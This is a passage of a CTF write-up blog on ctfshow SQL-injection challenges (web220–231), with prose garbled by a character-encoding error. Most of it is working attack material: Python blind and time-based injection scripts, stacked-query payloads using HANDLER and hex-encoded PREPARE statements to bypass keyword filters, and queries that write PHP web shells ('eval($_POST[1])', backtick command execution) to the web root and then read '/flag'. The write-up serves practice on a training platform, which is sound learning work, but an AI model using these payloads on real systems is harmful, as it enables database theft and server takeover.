table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;8e25fbd7-907b-44f6-a6b3-f350261adcce&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((left((select flagaabcc from ctfshow_flagxcac limit 0,1),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨<code>right</code>å’Œ<code>left</code>çš„ç»„åˆæ‹³ï¼Œæ¯”å¦‚<code>right(left((&quot;evo1&quot;),3),1)</code>ç­‰æ•ˆäº<code>substr(&quot;evo1&quot;,3,1)</code>ï¼Œç„¶åç”¨<code>ord</code>æ›¿æ¢<code>ascii</code>å³å¯</p>
<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒè¿™ç¯‡[<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">è½¬è½½]Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•</a>ï¼Œç‰ˆæœ¬é™åˆ¶(5.0.0-5.6.6)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?&amp;page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure>

<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><p><code>group by</code>ç›²æ³¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•åå‘ç°å‚æ•°<code>u</code>è¿”å›å­˜åœ¨å·®å¼‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?u=if(2&gt;1,username,0)</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;username&quot;:&quot;user1&quot;,&quot;pass&quot;:&quot;111&quot;&#125;,&#123;&quot;id&quot;:&quot;3&quot;,&quot;username&quot;:&quot;user2&quot;,&quot;pass&quot;:&quot;222&quot;&#125;,&#123;&quot;id&quot;:&quot;4&quot;,&quot;username&quot;:&quot;userAUTO&quot;,&quot;pass&quot;:&quot;passwordAUTO&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">/api/?u=if(2&lt;1,username,0)</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>æ•…å¯ä»¥è¿›è¡Œç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_,&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ace49909-4b0b-497d-99b9-a29fd0b2b99a.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        <span class="comment"># æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è¡¨ ctfshow_flaga,ctfshow_user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ— id,flagaabc,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ctfshow&#123;6eacd2b3-fbf3-44de-8701-f3263fcae9a8&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;?u=if((left((select group_concat(flagaabc) from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;),username,0)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯<code>group by</code>æŠ¥é”™æ³¨å…¥ï¼ŒåŸç†å¯ä»¥çœ‹è¿™ç¯‡<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">CTF-sql-mysql group byæŠ¥é”™æ³¨å…¥</a>ï¼Œä½†å‘ç°è¿˜æ˜¯è¦ç›²æ³¨ï¼Œè€Œä¸”è¦æ³¨æ„è¿‡æ»¤äº†æ•°å­—ï¼ˆå¯ä»¥ç”¨ä¸å¯è§å­—ç¬¦çš„<code>ascii</code>å€¼ï¼Œä¹Ÿå¯ä»¥æ‹¼æ¥<code>true</code>ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;ascii(&#x27;%0<span class="subst">&#123;num&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> num &lt;<span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;concat(ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">0</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">1</span>]&#125;</span>&#x27;))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;concat(ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">0</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">1</span>]&#125;</span>&#x27;),ascii(&#x27;%0<span class="subst">&#123;<span class="built_in">str</span>(num)[<span class="number">2</span>]&#125;</span>&#x27;))&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fc374013-4449-4e78-bcab-42593e62a39b.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select database()),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#è¡¨å ctfshow_flagas,ctfshow_user </span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#åˆ—å id,flagasabc,info</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?u=if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;div(i)&#125;,true))&lt;&#123;div(mid)&#125;),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ctfshow&#123;057db10a-06b4-47b7-a0a4-3467503fe372&#125;</span></span><br><span class="line">        payload = <span class="string">f&quot;?u=if((ascii(substr((select group_concat(flagasabc)from ctfshow_flagas),<span class="subst">&#123;div(i)&#125;</span>,true))&lt;<span class="subst">&#123;div(mid)&#125;</span>),username,false)&amp;page=1&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        response = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;passwordAUTO&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27; &#x27;</span> <span class="keyword">or</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>è®¿é—®<code>/robots.txt</code>å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /pwdreset.php</span><br></pre></td></tr></table></figure>

<p>è®¿é—®é¡µé¢é‡ç½®ç®¡ç†å‘˜å¯†ç åç™»å½•å‘ç°æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œè¿™ä¸ªæ³¨å…¥æ¯”è¾ƒå°‘è§ï¼Œç”¨ç¾¤é‡Œçš„<code>payload.bin</code>å³å¯ï¼Œæ–‡ä»¶å¤´éƒ¨æœ‰<code>sql</code>æ³¨å…¥å‘½ä»¤</p>
<p><img src="https://cdnjson.com/images/2023/02/08/web224.png" alt="web224.png"></p>
<p>åˆ›å»ºäº†<code>1.php</code>æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘½ä»¤æ‰§è¡Œå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/1.php?1=cat /flag</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½<code>upload.php</code>æºç çœ‹äº†ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">10</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;æ–‡ä»¶è¿‡å¤§: &quot;</span> .(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	  <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">      <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">	  <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	  <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		<span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å¾ˆå¤šæ–‡ä»¶ç±»å‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ç‚¹åœ¨è¿™é‡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„è¯­å¥æ”¾è¿›å»åä¼šé—­åˆå‰é¢çš„æ‹¬å·ï¼Œç„¶åå †å æ³¨å…¥å†™æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;filename&#x27;,&#x27;filepath&#x27;,&#x27;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;    </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å…ˆçœ‹ä¸‹<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104465584">å †å æ³¨å…¥å¼•å‘çš„æ€è€ƒ</a>å’Œ<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107823398">SQLæ³¨å…¥éšä¾¿æ³¨(ä¸‰ç§å§¿åŠ¿)</a>å­¦ä¹ ä¸‹</p>
<h3 id="æ–¹æ³•ä¸€-Handler"><a href="#æ–¹æ³•ä¸€-Handler" class="headerlink" title="æ–¹æ³•ä¸€ Handler"></a>æ–¹æ³•ä¸€ Handler</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctfshow_flagasa</span><br><span class="line">/api/?username=1&#x27;;show tables;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># flagas</span><br><span class="line">/api/?username=1&#x27;;show columns from ctfshow_flagasa;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;HANDLER ctfshow_flagasa OPEN as aaa;HANDLER aaa READ FIRST;&amp;page=1&amp;limit=10</span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagas&quot;:&quot;ctfshow&#123;bc3f1bc6-6ec5-4590-9362-f7610702c891&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•äºŒ-é¢„å¤„ç†"><a href="#æ–¹æ³•äºŒ-é¢„å¤„ç†" class="headerlink" title="æ–¹æ³•äºŒ é¢„å¤„ç†"></a>æ–¹æ³•äºŒ é¢„å¤„ç†</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctfshow_web</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; database()&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; flagas from ctfshow_flagasa&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from concat(char(115,101,108,101,99,116), &#x27; flagas from ctfshow_flagasa&#x27;);EXECUTE evo1;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è½¬æˆåå…­è¿›åˆ¶ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select database()</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c6563742064617461626173652829;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># show tables</span><br><span class="line"># ctfsh_ow_flagas</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73686f77207461626c6573;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line"># select * from ctfsh_ow_flagas</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagasb&quot;:&quot;ctfshow&#123;dc7176dd-fba9-4665-aebb-7f4c0d2c2cf7&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>è¿™é“é¢˜ç”¨å‰é¢çš„æ–¹æ³•æ‰¾ä¸åˆ°ï¼Œä¼ ä¸ªğŸä¸Šå»çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c65637420273c3f706870206576616c28245f504f53545b315d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f312e70687027;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æ•°æ®åº“è®°å¾—æ•°æ®åº“ç±»å‹è¦é€‰<code>MYSQLI</code>ï¼Œåœ¨<code>ROUTINES</code>å‘ç°<code>getFlag</code>æ–¹æ³•</p>
<p><img src="https://cdnjson.com/images/2023/02/08/web227.png" alt="web227.png"></p>
<p>å‘å³ç¿»æ‰¾åœ¨å®šä¹‰å¤„å¯ä»¥æ‰¾åˆ°<code>flag</code></p>
<p><img src="https://cdnjson.com/images/2023/02/08/web227-flag.png" alt="web227-flag.png"></p>
<p>çŸ¥é“åœ°æ–¹åå…¶å®ä¹Ÿå¯ä»¥ç›´æ¥æ³¨å…¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from information_schema.routines</span><br><span class="line">/api/?username=1&#x27;;PREPARE evo1 from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;EXECUTE evo1;#&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨<code>getFlag</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;call getFlag;</span><br></pre></td></tr></table></figure>

<h2 id="web228-230"><a href="#web228-230" class="headerlink" title="web228-230"></a>web228-230</h2><p>åŒ<code>web226</code></p>
<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ†é¡µæŸ¥è¯¢</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>update</code>æ³¨å…¥ï¼Œè®°å¾—æ”¹ç”¨<code>post</code>æ–¹æ³•</p>
